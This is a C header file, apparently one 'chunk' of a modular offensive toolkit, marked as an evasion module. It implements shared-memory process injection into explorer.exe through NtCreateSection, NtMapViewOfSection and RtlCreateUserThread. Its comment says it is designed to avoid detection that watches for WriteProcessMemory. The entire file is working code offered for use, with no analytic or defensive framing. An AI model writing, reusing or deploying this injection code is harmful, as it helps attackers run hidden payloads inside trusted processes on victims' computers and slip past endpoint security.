// chunk: evasion/ntmap_inject
// depends: (none)
// provides: ntmap_inject
// headers: windows.h
// risk: medium
// note: NtMapViewOfSection shared memory injection — creates a section object, maps it into both local and remote process, writes code to local view (which is shared), then triggers execution in remote. No WriteProcessMemory calls — avoids that detection vector entirely.

#ifndef CHUNK_NTMAP_INJECT
#define CHUNK_NTMAP_INJECT

#include <tlhelp32.h>

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnRtlCreateUserThread)(HANDLE, PVOID, BOOLEAN, ULONG, PSIZE_T, PSIZE_T, PVOID, PVOID, PHANDLE, PVOID);

static DWORD nm_find_target(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static int ntmap_inject(BYTE *code, DWORD code_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtCreateSection pNtCreateSection = (pfnNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pfnNtMapViewOfSection pNtMapView = (pfnNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pfnRtlCreateUserThread pRtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");

    if (!pNtCreateSection || !pNtMapView || !pRtlCreateUserThread) return 0;

    DWORD pid = nm_find_target();
    if (!pid) return 0;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 0;

    // Create section object
    LARGE_INTEGER section_size;
    section_size.QuadPart = code_size;

    HANDLE hSection = NULL;
    NTSTATUS status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                        &section_size, PAGE_EXECUTE_READWRITE,
                                        SEC_COMMIT, NULL);
    if (status != 0) {
        CloseHandle(hProc);
        return 0;
    }

    // Map into local process (RW)
    PVOID local_view = NULL;
    SIZE_T view_size = 0;
    status = pNtMapView(hSection, GetCurrentProcess(), &local_view, 0, code_size,
                         NULL, &view_size, 1, 0, PAGE_READWRITE);
    if (status != 0) {
        CloseHandle(hSection);
        CloseHandle(hProc);
        return 0;
    }

    // Map into remote process (RX)
    PVOID remote_view = NULL;
    SIZE_T remote_size = 0;
    status = pNtMapView(hSection, hProc, &remote_view, 0, code_size,
                         NULL, &remote_size, 1, 0, PAGE_EXECUTE_READ);
    if (status != 0) {
        CloseHandle(hSection);
        CloseHandle(hProc);
        return 0;
    }

    // Write code to local view — it appears in remote view automatically (shared memory)
    memcpy(local_view, code, code_size);

    // Create thread in remote process pointing to remote view
    HANDLE hThread = NULL;
    pRtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, remote_view, NULL, &hThread, NULL);

    CloseHandle(hSection);
    CloseHandle(hProc);
    if (hThread) CloseHandle(hThread);

    return (hThread != NULL) ? 1 : 0;
}

#endif
